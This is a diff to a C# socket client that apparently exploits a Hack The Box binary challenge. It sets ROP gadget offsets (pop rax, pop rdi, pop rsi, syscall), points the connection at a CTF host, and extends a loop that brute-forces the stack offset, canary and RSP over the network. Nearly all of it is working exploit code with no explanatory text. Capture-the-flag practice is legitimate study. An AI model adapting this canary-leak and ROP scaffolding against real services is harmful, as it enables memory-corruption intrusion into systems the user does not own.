@@ -8,25 +8,25 @@ namespace dSocket
 {
     public class Rop
     {
-        public const int RAX     = 0x0000000000000b51; // pop rax; ret
-        public const int RBP     = 0x0000000000000a90; // pop rbp; ret
-        public const int RDI     = 0x0000000000000f73; // pop rdi; ret
-        public const int RDX     = 0x0000000000000b53; // pop rdx; ret
+        public const int RAX = 0x0000000000000b51; // pop rax; ret
+        public const int RBP = 0x0000000000000a90; // pop rbp; ret
+        public const int RDI = 0x0000000000000f73; // pop rdi; ret
+        public const int RDX = 0x0000000000000b53; // pop rdx; ret
         public const int RSIplus = 0x0000000000000f71; // pop rsi; pop r15; ret
         public const int RSPplus = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
-        public const int LeaveR  = 0x0000000000000b6d; // leave ; ret
+        public const int LeaveR = 0x0000000000000b6d; // leave ; ret
         public const int Syscall = 0x0000000000000b55; // syscall ; ret
     }
     class Program
     {
-        private const string Host = "192.168.1.93";
-        private const int Port = 5555;
+        private const string Host = "docker.hackthebox.eu";
+        private const int Port = 46854;
 
         private static Socket ConnectSocket()
         {
-            // IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
-            // IPAddress ipAddress = ipHostInfo.AddressList[0];
-            IPAddress ipAddress = IPAddress.Parse(Host); 
+            IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
+            IPAddress ipAddress = ipHostInfo.AddressList[0];
+            // IPAddress ipAddress = IPAddress.Parse(Host);
             IPEndPoint ipe = new IPEndPoint(ipAddress, Port);
 
             Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
@@ -104,9 +104,17 @@ namespace dSocket
                         {
                             Console.Write("\n[+] Success! Offset: ");
                         }
+                        else if (inputBuffer.Length == 1049)
+                        {
+                            Console.Write("[+] Success! RSP: ");
+                        }
                         if (inputBuffer.Length > 1032)
                         {
                             Console.Write("{0}", h.ToString("x2"));
+                            if (totalFound == 16)
+                            {
+                                Console.WriteLine("");
+                            }
                         }
                         break;
                     }
@@ -135,10 +143,10 @@ namespace dSocket
                 RSPStr += RSP[j].ToString("x2");
             }
 
-            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);            
+            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);
 
             return inputBuffer;
-        }        
+        }
         private static byte[] GetPayload()
         {
             byte[] bytes = new byte[1024];
